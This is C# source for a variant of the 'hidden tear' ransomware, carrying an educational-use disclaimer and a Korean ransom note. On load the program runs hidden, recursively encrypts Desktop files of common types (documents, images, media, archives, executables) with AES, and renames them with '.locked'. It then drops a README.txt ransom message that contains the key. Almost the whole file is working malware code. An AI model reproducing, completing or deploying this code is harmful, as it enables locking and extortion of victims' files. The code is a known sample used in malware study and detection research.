/*
 _     _     _     _              _                  
| |   (_)   | |   | |            | |                 
| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
| '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
 
 * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
 * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
 * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
 * 
 * Ve durdu saatler 
 * Susuyor seni zaman
 * Sesin dondu kulagimda
 * Dedi uykudan uyan
 * 
 * Yine boyle bir aksamdi
 * Sen guluyordun ya gozlerimin icine
 * Feslegenler boy vermisti
 * Gokten parlak bir yildiz dustu pesine
 * Sakladim gozyaslarimi
 */

using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;


namespace hidden_tear
{
    public partial class Form1 : Form
    {
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";



        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //starts encryption at form load
            startAction();

        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //creates random password for encryption
        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--){
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        //Sends created password target location
        public void SendPassword(string password){
            

        }

        //Encrypts single file
        public void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file+".locked");

            
            

        }

        //encrypts target directory
        public void encryptDirectory(string location, string password)
        {
            
            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".jpg", ".png", ".mp3", ".mp4", ".locked", ".pdf", ".docx", ".hwp", ".wav", ".zip", ".wav", ".flac", ".html", ".php", ".sln", ".exe"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++){
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    EncryptFile(files[i],password);
                }
            }
            for (int i = 0; i < childDirectories.Length; i++){
                encryptDirectory(childDirectories[i],password);
            }
            
            
        }

        public void startAction()
        {
            string password = CreatePassword(35);
            string path = "\\Desktop";
            string startPath = userDir + userName + path;
            SendPassword(password);
            encryptDirectory(startPath,password);
            messageCreator();
            string txtpath = "\\Desktop\\README.txt";
            string fullpath = userDir + userName + txtpath;
            string[] lines = { "한국어 " + userName + "님에게, \n귀하의 소중한 문서, 사진, 데이터베이스 및 기타 중요한 파일들이 BLACKWAN에 의해 암호화 되었습니다.\n======================================================================\n추가적인 바이러스 감염을 막기위해, 귀하의 모든 파일이 암호화 되었으며, 엑세스할 수 없습니다.\n\n파일들은 손상되지 않았지만, 잠깐 수정이 된것입니다. 따라서 다시 원본으로 되돌릴 수 있습니다.\n\n파일을 해독하는 유일한 방법은 개인 키와 복호화 프로그램을 받는것입니다.\n\n다른 소프트웨어로 파일을 수정할려고 하는 시도는 영원히 파일을 복구할 수 없게 만드는 것입니다.\n\n우리의 최첨단 복호화 프로그램은 귀하의 모든 파일을 100% 복호화 할 수 있음을 증명합니다.\n======================================================================\n이 랜섬웨어는 교육의 목적으로 만들어진 랜섬웨어입니다.\n혹시나 이 랜섬웨어에 감염이 되셨다면, 해당메일로 문의주세요!\nmail : help@esoftkorea.co.kr, DB유진\n\n- 이 key는 복호화 할때 사용되며 절대 README.txt를 삭제하시면 안됩니다. -\nPassword : " + password};
            System.IO.File.WriteAllLines(fullpath, lines);
            password = null;
            System.Windows.Forms.Application.Exit();
        }

        public void messageCreator()
        {

        }
    }
}
